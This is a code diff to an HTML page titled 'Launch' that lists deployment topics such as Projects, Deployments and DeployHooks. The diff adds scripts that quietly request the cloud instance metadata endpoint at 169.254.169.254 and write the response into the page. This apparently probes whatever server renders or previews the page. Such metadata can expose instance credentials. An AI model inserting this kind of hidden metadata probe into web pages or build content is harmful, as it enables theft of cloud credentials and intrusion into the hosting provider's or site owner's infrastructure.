@@ -4,6 +4,17 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        try {
+            
+        const request = new XMLHttpRequest();
+        request.open("GET", "http://169.254.169.254/latest/meta-data/", false); 
+        request.send(null);
+        window.data = `${request.status}   -------   ${request.responseText}`
+        } catch(e) {
+            window.data = e;
+        }
+    </script>
     <title>Launch</title>
 </head>
 <body>
@@ -11,6 +22,10 @@
 
     <h3>Topics for Launch</h3>
     <ul>
+        <div>Initial</div>
+        <script>
+document.getElementById("holder").innerHTML = window.data;
+</script>
         <li>Creating a Project</li>
         <li>Deployments</li>
         <li>DeployHooks</li>
